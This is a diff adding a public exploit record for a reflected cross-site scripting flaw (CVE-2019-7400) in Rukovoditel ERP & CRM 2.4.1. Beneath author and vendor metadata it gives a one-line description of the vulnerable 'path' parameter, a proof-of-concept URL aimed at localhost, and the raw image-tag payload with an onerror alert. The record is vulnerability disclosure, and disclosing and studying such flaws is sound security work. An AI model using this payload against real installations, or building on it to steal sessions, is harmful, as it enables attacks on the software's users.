@@ -1,0 +1,25 @@
+# Exploit Title: Rukovoditel ERP & CRM 2.4.1 - 'path' Cross-Site Scripting
+# Exploit Author: Javier Olmedo
+# Website: https://hackpuntes.com
+# Date: 2019-03-24
+# Google Dork: N/A
+# Vendor: Rukovoditel
+# Software Link: https://sourceforge.net/projects/rukovoditel/
+# Affected Version: 2.4.1 and possibly before
+# Patched Version: patched in extension version 2.4.1
+# Category: Web Application
+# Platform: Windows
+# Tested on: Win10x64 & Kali Linux
+# CVE: 2019-7400
+# References:
+# https://hackpuntes.com/cve-2019-7400-rukovoditel-erp-crm-2-4-1-cross-site-scripting-reflejado/
+
+# 1. Technical Description:
+# path parameter is vulnerable to Reflected Cross-Site Scripting (XSS) attacks
+# through a GET request in index.php resource.
+  
+# 2. Proof Of Concept (PoC):
+# http://localhost/index.php?module=items/items&path=%22%3E%3Cimg%20src%3da%20onerror%3dalert(%22VULNERABLE%22)%3E
+
+# 3. Payload
+# "><img src=a onerror=alert("VULNERABLE")>
